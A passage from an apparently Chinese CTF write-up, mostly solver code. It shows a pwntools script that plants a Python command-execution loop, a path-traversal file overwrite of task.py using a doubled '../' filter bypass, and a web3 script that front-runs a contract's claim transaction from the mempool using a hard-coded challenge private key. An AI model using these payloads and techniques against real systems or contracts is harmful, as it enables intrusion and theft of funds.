class="number">2025</span>)]</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Your option:&#x27;</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;to aim:&#x27;</span>,(<span class="built_in">str</span>(tmpx)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(tmpy)).encode())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    check1 = r.recvrepeat(<span class="number">2</span>).decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Victory&#x27;</span> <span class="keyword">in</span> check1:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    r.sendline(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">int</span>(tmp1.split(<span class="string">&#x27;~&#x27;</span>)[<span class="number">0</span>].strip()),<span class="built_in">int</span>(tmp1.split(<span class="string">&#x27;~&#x27;</span>)[<span class="number">1</span>].strip()))</span><br><span class="line">    fake0 = <span class="built_in">int</span>(rnd.randint(<span class="built_in">int</span>(tmp1.split(<span class="string">&#x27;~&#x27;</span>)[<span class="number">0</span>].strip()),<span class="built_in">int</span>(tmp1.split(<span class="string">&#x27;~&#x27;</span>)[<span class="number">1</span>].strip()))**(random.random()*<span class="number">8</span>))</span><br><span class="line">    <span class="comment"># print(fake0)</span></span><br><span class="line">    tmpx,tmpy = [rnd.randrange(<span class="number">2025</span>),rnd.randrange(<span class="number">2025</span>)]</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;to aim:&#x27;</span>,(<span class="built_in">str</span>(tmpx)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(tmpy)).encode())</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line">final=<span class="string">&#x27;&#x27;&#x27;import os</span></span><br><span class="line"><span class="string">while True:</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        cmd = input(&#x27;&gt;&#x27;)</span></span><br><span class="line"><span class="string">        print(os.popen(cmd).read())</span></span><br><span class="line"><span class="string">    except:</span></span><br><span class="line"><span class="string">        pass&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> final.splitlines():</span><br><span class="line">    r.sendline(i.encode())</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;)</span></span><br><span class="line"><span class="comment"># io.interactive()</span></span><br></pre></td></tr></table></figure>

<p>还有一段黑盒可以写文件，我直接写task.py覆盖，需双写绕过..&#x2F;过滤@周怡 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(os.popen(cmd).read())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h3 id="x1guessgame-revenge"><a href="#x1guessgame-revenge" class="headerlink" title="x1guessgame_revenge"></a>x1guessgame_revenge</h3><p>web3！！！</p>
<p>前跑 区块链攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">claim_txn = challenge_contract.functions.claim(answer).build_transaction(&#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: deploy_address,</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: web3.eth.get_transaction_count(deploy_address),</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">2000000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: web3.to_wei(<span class="string">&#x27;21&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>check_winner 会先明文传递一个正确答案然后在链上根据答案来确定赢家</p>
<p>即可循环监听链上情况，捉明文答案后以更高gas完成抢跑，从而赢下比赛</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接配置</span></span><br><span class="line">infura_url = <span class="string">&quot;http://60.205.163.215:18916/rpc&quot;</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(infura_url))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> web3.is_connected():</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;not connected&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载合约信息</span></span><br><span class="line">contract_abi = json.loads(<span class="built_in">open</span>(<span class="string">&#x27;1.abi&#x27;</span>).read())</span><br><span class="line">deploy_private_key = <span class="string">&#x27;0x28f000313227c9371400e5145fd569bfc423fd517780f81afb61563ea3157691&#x27;</span></span><br><span class="line">deploy_address = web3.eth.account.from_key(deploy_private_key).address</span><br><span class="line">target_address = <span class="string">&quot;0xF8450AdE88E2284e5290b840dDA7A51495021215&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;你的地址: <span class="subst">&#123;deploy_address&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;目标合约: <span class="subst">&#123;target_address&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">challenge_contract = web3.eth.contract(address=target_address, abi=contract_abi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 基本信息收集</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">collect_basic_info</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n=== 基本信息收集 ===&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target = challenge_contract.functions.target().call()</span><br><span class="line">        is_claimed = challenge_contract.functions.isClaimed().call()</span><br><span class="line">        winner = challenge_contract.functions.winner().call()</span><br><span class="line">        balance = web3.eth.get_balance(target_address)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Target hash: <span class="subst">&#123;target.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Is claimed: <span class="subst">&#123;is_claimed&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Winner: <span class="subst">&#123;winner&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Contract balance: <span class="subst">&#123;web3.from_wei(balance, <span class="string">&#x27;ether&#x27;</span>)&#125;</span> ETH&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> target, is_claimed</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;获取基本信息失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 尝试各种RPC方法获取信息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_rpc_methods</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n=== 尝试RPC信息泄露 ===&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 尝试获取交易池信息</span></span><br><span class="line">    methods_to_try = [</span><br><span class="line">        (<span class="string">&quot;txpool_content&quot;</span>, []),</span><br><span class="line">        (<span class="string">&quot;txpool_inspect&quot;</span>, []),</span><br><span class="line">        (<span class="string">&quot;txpool_status&quot;</span>, []),</span><br><span class="line">        (<span class="string">&quot;net_peerCount&quot;</span>, []),</span><br><span class="line">        (<span class="string">&quot;eth_accounts&quot;</span>, []),</span><br><span class="line">        (<span class="string">&quot;personal_listAccounts&quot;</span>, []),</span><br><span class="line">        (<span class="string">&quot;debug_getBlockRlp&quot;</span>, [<span class="string">&quot;latest&quot;</span>]),</span><br><span class="line">        (<span class="string">&quot;trace_replayBlockTransactions&quot;</span>, [<span class="string">&quot;latest&quot;</span>, [<span class="string">&quot;trace&quot;</span>]]),</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> method, params <span class="keyword">in</span> methods_to_try:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = web3.provider.make_request(method, params)</span><br><span class="line">            <span class="keyword">if</span> result.get(<span class="string">&#x27;result&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;✓ <span class="subst">&#123;method&#125;</span>: <span class="subst">&#123;result[<span class="string">&#x27;result&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;✗ <span class="subst">&#123;method&#125;</span>: <span class="subst">&#123;result.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;No result&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;✗ <span class="subst">&#123;method&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 分析合约创建交易</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analyze_creation_transaction</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n=== 分析合约创建交易 ===&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 获取合约的创建信息</span></span><br><span class="line">        latest_block = web3.eth.get_block(<span class="string">&#x27;latest&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 搜索最近几个区块中的合约创建交易</span></span><br><span class="line">        <span class="keyword">for</span> block_num <span class="keyword">in</span> <span class="built_in">range</span>(latest_block[<span class="string">&#x27;number&#x27;</span>] - <span class="number">10</span>, latest_block[<span class="string">&#x27;number&#x27;</span>] + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                block = web3.eth.get_block(block_num, full_transactions=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">&#x27;transactions&#x27;</span>]:</span><br><span class="line">                    <span class="keyword">if</span> tx[<span class="string">&#x27;to&#x27;</span>] <span class="keyword">is</span> <span class="literal">None</span>:  <span class="comment"># 合约创建交易</span></span><br><span class="line">                        receipt = web3.eth.get_transaction_receipt(tx[<span class="string">&#x27;hash&#x27;</span>])</span><br><span class="line">                        <span class="keyword">if</span> receipt[<span class="string">&#x27;contractAddress&#x27;</span>] == target_address:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;找到合约创建交易: <span class="subst">&#123;tx[<span class="string">&#x27;hash&#x27;</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;创建者: <span class="subst">&#123;tx[<span class="string">&#x27;from&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;Input数据长度: <span class="subst">&#123;<span class="built_in">len</span>(tx[<span class="string">&#x27;input&#x27;</span>])&#125;</span>&quot;</span>)</span><br><span class="line">                            </span><br><span class="line">                            <span class="comment"># 尝试解码构造函数参数</span></span><br><span class="line">                            <span class="comment"># Constructor takes bytes32 _target</span></span><br><span class="line">                            <span class="keyword">if</span> <span class="built_in">len</span>(tx[<span class="string">&#x27;input&#x27;</span>]) &gt; <span class="number">10</span>:  <span class="comment"># 4字节函数选择器 + 参数</span></span><br><span class="line">                                constructor_params = tx[<span class="string">&#x27;input&#x27;</span>][<span class="number">10</span>:]  <span class="comment"># 跳过合约bytecode</span></span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">f&quot;可能的构造参数: <span class="subst">&#123;constructor_params&#125;</span>&quot;</span>)</span><br><span class="line">                            </span><br><span class="line">                            <span class="keyword">return</span> tx</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;分析创建交易失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 监听pending交易(抢跑攻击)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">front_run_attack</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n=== 启动抢跑监听 ===&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 获取pending交易</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                pending_block = web3.eth.get_block(<span class="string">&#x27;pending&#x27;</span>, full_transactions=<span class="literal">True</span>)</span><br><span class="line">                transactions = pending_block.get(<span class="string">&#x27;transactions&#x27;</span>, [])</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="comment"># 如果pending块不可用，尝试其他方法</span></span><br><span class="line">                transactions = []</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 检查mempool</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                txpool = web3.provider.make_request(<span class="string">&quot;txpool_content&quot;</span>, [])</span><br><span class="line">                <span class="keyword">if</span> txpool.get(<span class="string">&#x27;result&#x27;</span>, &#123;&#125;).get(<span class="string">&#x27;pending&#x27;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;发现pending交易池内容...&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> addr, txs <span class="keyword">in</span> txpool[<span class="string">&#x27;result&#x27;</span>][<span class="string">&#x27;pending&#x27;</span>].items():</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;地址 <span class="subst">&#123;addr&#125;</span> 有 <span class="subst">&#123;<span class="built_in">len</span>(txs)&#125;</span> 个待处理交易&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 分析每个交易</span></span><br><span class="line">            <span class="keyword">for</span> tx <span class="keyword">in</span> transactions:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> tx.get(<span class="string">&#x27;to&#x27;</span>) <span class="keyword">and</span> tx[<span class="string">&#x27;to&#x27;</span>].lower() == target_address.lower():</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;\n🎯 发现目标交易: <span class="subst">&#123;tx[<span class="string">&#x27;hash&#x27;</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;从: <span class="subst">&#123;tx[<span class="string">&#x27;from&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;Gas Price: <span class="subst">&#123;web3.from_wei(tx[<span class="string">&#x27;gasPrice&#x27;</span>], <span class="string">&#x27;gwei&#x27;</span>)&#125;</span> gwei&quot;</span>)</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment"># 尝试解码交易</span></span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            func_obj, func_params = challenge_contract.decode_function_input(tx[<span class="string">&#x27;input&#x27;</span>])</span><br><span class="line">                            <span class="keyword">if</span> func_obj.fn_name == <span class="string">&#x27;claim&#x27;</span>:</span><br><span class="line">                                answer = func_params[<span class="string">&#x27;answer&#x27;</span>]</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">f&quot;🔑 发现答案: <span class="subst">&#123;answer.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">                                </span><br><span class="line">                                <span class="comment"># 立即发起抢跑交易</span></span><br><span class="line">                                <span class="keyword">return</span> execute_front_run(answer, tx[<span class="string">&#x27;gasPrice&#x27;</span>])</span><br><span class="line">                        <span class="keyword">except</span> Exception <span class="keyword">as</span> decode_error:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;解码失败: <span class="subst">&#123;decode_error&#125;</span>&quot;</span>)</span><br><span class="line">                            </span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            time.sleep(<span class="number">1</span>)  <span class="comment"># 等待1秒再次检查</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n用户中断监听&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;监听出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 执行抢跑交易</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_front_run</span>(<span class="params">answer, original_gas_price</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n🚀 执行抢跑攻击...&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        higher_gas_price = <span class="built_in">int</span>(original_gas_price * <span class="number">1.5</span>)</span><br><span class="line">        </span><br><span class="line">        claim_txn = challenge_contract.functions.claim(answer).build_transaction(&#123;</span><br><span class="line">            <span class="string">&#x27;from&#x27;</span>: deploy_address,</span><br><span class="line">            <span class="string">&#x27;nonce&#x27;</span>: web3.eth.get_transaction_count(deploy_address),</span><br><span class="line">            <span class="string">&#x27;gas&#x27;</span>: <span class="number">300000</span>,</span><br><span class="line">            <span class="string">&#x27;gasPrice&#x27;</span>: higher_gas_price</span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">        signed_txn = web3.eth.account.sign_transaction(claim_txn, private_key=deploy_private_key)</span><br><span class="line">        tx_hash = web3.eth.send_raw_transaction(signed_txn.raw_transaction)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;✅ 抢跑交易已发送: <span class="subst">&#123;tx_hash.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">        receipt = web3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;🎉 抢跑成功!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;❌ 抢跑失败&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;抢跑执行失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 尝试直接破解(如果有已知模式)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_direct_crack</span>(<span class="params">target_hash</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n=== 尝试直接破解 ===&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;目标哈希: <span class="subst">&#123;target_hash.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 尝试一些常见的答案</span></span><br><span class="line">    common_answers = [</span><br><span class="line">        <span class="string">b&quot;flag&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;answer&quot;</span>, </span><br><span class="line">        <span class="string">b&quot;password&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;secret&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;challenge&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;hello&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;test&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;root&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;key&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> answer <span class="keyword">in</span> common_answers:</span><br><span class="line">        <span class="comment"># 填充到32字节</span></span><br><span class="line">        padded_answer = answer.ljust(<span class="number">32</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> web3.keccak(padded_answer) == target_hash:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;🎯 找到答案: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> padded_answer</span><br><span class="line">            </span><br><span class="line">    <span class="comment"># 尝试32字节的零填充变体</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        test_answer = <span class="built_in">bytes</span>([i]) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">31</span></span><br><span class="line">        <span class="keyword">if</span> web3.keccak(test_answer) == target_hash:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;🎯 找到答案: <span class="subst">&#123;test_answer.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> test_answer</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主执行流程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;🎮 Challenge 合约攻击脚本启动&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 收集基本信息</span></span><br><span class="line">    target_hash, is_claimed = collect_basic_info()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> is_claimed:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;❌ 合约已被领取，游戏结束&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> target_hash:</span><br><span class="line">        <span class="comment"># 尝试直接破解</span></span><br><span class="line">        answer = try_direct_crack(target_hash)</span><br><span class="line">        <span class="keyword">if</span> answer:</span><br><span class="line">            <span class="built_in">print</span>(<span 